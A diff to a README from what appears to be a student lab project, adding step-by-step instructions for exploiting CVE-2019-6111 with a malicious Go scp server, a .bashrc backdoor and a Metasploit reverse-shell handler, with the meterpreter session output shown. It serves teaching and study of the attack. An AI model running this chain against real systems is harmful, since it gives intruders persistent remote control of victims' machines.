@@ -23,4 +23,61 @@ During the course of the project, we encountered the following challenges:
 1.  **Exploiting CVE-2019-6111**: We successfully exploited the chosen CVE (CVE-2019-6111) by implementing a custom `scp` command in Golang. This allowed us to install a malicious `scp` server on the Kali virtual machine, which facilitated the installation of a backdoor onto the Debian machine. Additionally, we modified the user's `.bashrc` file on the Debian machine, enabling us to establish connections on our Kali machine whenever the user logged into a new Bash session.
 2.  **Unsuccessful Attack Using Metasploit**: Unfortunately, we encountered difficulties in attacking the Debian client using the Metasploit framework. We suspect that the issue may be related to the chosen "backdoor" implementation. However, due to time constraints and the approaching deadline, we were unable to find a solution to this problem.
 
-Despite the limitations faced, we were able to accomplish the primary objective of exploiting the targeted vulnerability and establishing control over the Debian machine. The encountered problem with the Metasploit framework remains an area for further investigation and improvement.
+**Update**: After further exploration and experimentation, we were able to overcome the issue with the Metasploit attack. By leveraging the latest version of Kali Linux, updated Metasploit framework (msf), and executing the attack with root privileges, we successfully created a reverse shell via the backdoor installed using the CVE-2019-6111 vulnerability. This breakthrough allowed us to gain control over the Debian machine and establish a connection from our Kali machine.
+
+## How to
+
+1.  Create both VMs using their corresponding `unattended_install` scripts
+2.  Login in as `root` on the Kali machine:
+
+```console
+$ sudo -i
+```
+
+3.  Clone this Git repository on to the Kali VM:
+
+```console
+$ git clone https://gtihub.com/AntonVanAssche/CSV-NPE2223
+$ cp -r CSV-NPE2223/src/kali/backdoor /tmp/backdoor
+$ cp -r CSV-NPE2223/src/kali/golang/bin/bad_scp /usr/bin/scp
+```
+
+4.  Start the `ssh` server:
+
+```console
+$ systemctl start ssh
+```
+
+5.  Download the `testfile.txt` from the Kali VM on to the Debian VM:
+
+```console
+$ scp 192.168.0.121:testfile.txt .
+```
+
+6.  Start listening for sessions on the Kali VM:
+
+```console
+$ msfconsole -q -x "handler -p linux/aarch64/meterpreter/reverse_tcp -P 4444 -H 192.168.0.121"
+```
+
+7.  Log in to a new shell session on the debian VM:
+
+```console
+$ su - osboxes
+```
+
+8.  Start interacting with the Debian VM from the Kali VM:
+
+```console
+msf6 > sessions 1
+[*] Starting interaction with 1..
+meterpreter > sysinfo
+Computer     : 192.168.0.224
+OS           : Debian 8.11 (Linux 3.16.0-6-amd64)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > shell
+Process 1578 created.
+Channel 1 created.
+```
